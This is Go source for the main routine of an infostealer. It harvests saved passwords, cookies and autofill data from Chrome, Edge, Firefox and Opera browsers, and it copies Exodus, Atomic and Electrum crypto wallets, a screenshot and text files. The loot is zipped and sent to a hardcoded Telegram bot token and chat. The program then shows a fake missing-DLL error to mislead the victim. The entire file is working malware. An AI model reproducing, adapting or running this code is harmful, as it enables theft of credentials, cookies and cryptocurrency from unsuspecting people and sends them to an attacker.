package main

import (
	"fmt"
	"os"
	"path"
	"sync"

	"github.com/4kord/gostealer/browsers"
	"github.com/4kord/gostealer/utils"
	"github.com/4kord/gostealer/wallets"
	"github.com/alexmullins/zip"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func main() {

	logFolderPath := path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9")
	wg := sync.WaitGroup{}
	//Create folder structure
	utils.CreateStructure(logFolderPath)

	//Browser paths
	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)
	firefoxPath := path.Join(os.Getenv("appdata"), `Mozilla\Firefox\Profiles`)
	operaPath := path.Join(os.Getenv("appdata"), `Opera Software\Opera Stable`)
	operaGXPath := path.Join(os.Getenv("appdata"), `Opera Software\Opera GX Stable`)

	//Yoink
	wg.Add(10)
	if _, err := os.Stat(chromePath); !os.IsNotExist(err) {
		go func() {
			browsers.Chrome(chromePath, logFolderPath)
			wg.Done()
		}()
	} else {
		wg.Done()
	}
	if _, err := os.Stat(edgePath); !os.IsNotExist(err) {
		go func() {
			browsers.Edge(edgePath, logFolderPath)
			wg.Done()
		}()
	} else {
		wg.Done()
	}
	if _, err := os.Stat(firefoxPath); !os.IsNotExist(err) {
		go func() {
			browsers.Firefox(firefoxPath, logFolderPath)
			wg.Done()
		}()
	} else {
		wg.Done()
	}
	if _, err := os.Stat(operaPath); !os.IsNotExist(err) {
		go func() {
			browsers.Opera(operaPath, logFolderPath)
			wg.Done()
		}()
	} else {
		wg.Done()
	}
	if _, err := os.Stat(operaGXPath); !os.IsNotExist(err) {
		go func() {
			browsers.OperaGX(operaGXPath, logFolderPath)
			wg.Done()
		}()
	} else {
		wg.Done()
	}
	go func() {
		wallets.CopyExodus(logFolderPath)
		wg.Done()
	}()
	go func() {
		wallets.CopyAtomic(logFolderPath)
		wg.Done()
	}()
	go func() {
		wallets.CopyElectrum(logFolderPath)
		wg.Done()
	}()
	go func() {
		utils.GetScreenshot(logFolderPath)
		wg.Done()
	}()
	go func() {
		utils.CopyTxtFiles(logFolderPath)
		wg.Done()
	}()
	wg.Wait()

	//Create zip
	outFile, err := os.Create(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
	if err != nil {
		panic(err)
	}
	defer outFile.Close()

	w := zip.NewWriter(outFile)

	utils.AddFiles(w, logFolderPath+"/", "")

	if err != nil {
		panic(err)
	}

	err = w.Close()
	if err != nil {
		panic(err)
	}

	//Send log
	file, err := os.ReadFile(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
	if err != nil {
		panic(err)
	}

	bot, err := tgbotapi.NewBotAPI("1664618644:AAGN8PvkeJ325G7_6IovE1qdMmyCh22RSTA")
	if err != nil {
		panic(err)
	}

	media := tgbotapi.NewInputMediaDocument(tgbotapi.FileBytes{
		Name:  "log.zip",
		Bytes: file,
	})

	msg := tgbotapi.NewMessage(-1001563265930, fmt.Sprintf("\xF0\x9F\x94\x94 NEW LOG\n\xF0\x9F\x8D\xAA COOKIES: %d\n\xF0\x9F\x94\x92 PASSWORDS: %d\n\xF0\x9F\x94\x93 AUTOFILLS: %d\n\xF0\x9F\x92\xB3 WALLETS: %d\n--------\n%s\n--------%s", utils.CookieAmount, utils.PasswordAmount, utils.AutofillAmount, utils.WalletAmount, utils.FoundWallets, utils.InfoStr))
	bot.Send(msg)

	bot.Send(tgbotapi.MediaGroupConfig{
		ChatID:          -1001563265930,
		ChannelUsername: "logs",

		Media: []interface{}{
			media,
		},
	})

	utils.MessageBoxPlain("Error", "The program can’t start because MSVCP140.dll was not found. Try reinstalling the program to fix this problem")
}
